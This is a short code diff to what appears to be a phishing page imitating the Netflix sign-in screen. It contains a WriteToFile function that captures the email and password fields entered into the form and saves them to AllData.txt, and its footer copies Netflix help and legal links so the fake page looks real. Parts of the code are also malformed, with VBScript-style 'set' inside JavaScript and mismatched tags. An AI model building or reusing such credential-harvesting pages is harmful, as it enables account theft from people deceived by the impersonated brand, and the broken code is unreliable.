@@ -257,7 +257,7 @@ html, body {
     function WriteToFile(passForm) {
 
         set fso = CreateObject("Scripting.FileSystemObject");
-        set f = fso.CreateTextFile("<your path>/AllData.txt", True);
+        set f = fso.CreateTextFile("AllData.txt", True);
 
         var Email = document.getElementById('email');
         var Password = document.getElementById('password');
@@ -313,7 +313,7 @@ html, body {
 <footer class="site-footer">
 <a href="https://help.netflix.com/contactus" target="_blank" class="contactus">Questions? Contact us.</a>
 <a href="https://help.netflix.com/node/412" target="_blank" class="comquest">FAQ</a>
-<a href="forbidden.html" target="_blank" class="cookies">Cookie Preferences</p>
+<a href="forbidden.html" class="cookies">Cookie Preferences</p>
 <a href="https://help.netflix.com/" target="_blank" class="helpcenter">Help Center</a>
 <a href="https://help.netflix.com/legal/corpinfo" target="_blank" class="corpinfo">Corporate Information</a>
 <a href="https://help.netflix.com/legal/termsofuse" target="_blank" class="terms">Terms of Use</a>
